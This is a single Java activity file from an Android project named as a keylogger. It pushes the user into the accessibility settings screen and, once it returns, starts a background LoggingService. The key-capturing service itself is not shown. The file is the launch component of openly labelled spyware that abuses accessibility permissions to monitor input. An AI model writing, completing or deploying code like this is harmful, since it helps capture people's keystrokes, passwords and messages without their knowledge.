package com.viveksb007.androidkeylogger;

import android.content.Intent;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = MainActivity.class.getSimpleName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        try {
            if (Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED) != 1) {
                Intent accessibilityPermission = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(accessibilityPermission, 1);
            }
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {
            Log.v(TAG, "Got Accessibility Permission");
            Intent loggingService = new Intent(this, LoggingService.class);
            startService(loggingService);
        }
    }
}
